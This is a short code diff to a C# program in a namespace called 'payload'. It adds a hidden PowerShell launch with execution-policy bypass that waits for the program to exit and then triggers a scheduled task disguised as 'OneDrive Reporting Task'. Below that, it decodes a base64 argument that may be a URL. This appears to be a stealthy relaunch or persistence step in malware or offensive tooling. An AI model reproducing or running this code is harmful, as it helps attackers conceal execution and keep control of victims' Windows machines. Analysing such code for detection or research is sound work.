@@ -43,6 +43,13 @@ namespace payload
 
         static void Main(string[] args)
         {
+            Process.Start(new ProcessStartInfo()
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-noprofile -executionpolicy bypass -command \"[System.Diagnostics.Process]::GetProcessById({Process.GetCurrentProcess().Id}).WaitForExit(); schtasks /run /i /tn 'OneDrive Reporting Task'\"",
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
+
             string token = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
             if (Uri.IsWellFormedUriString(token, UriKind.Absolute))
             {
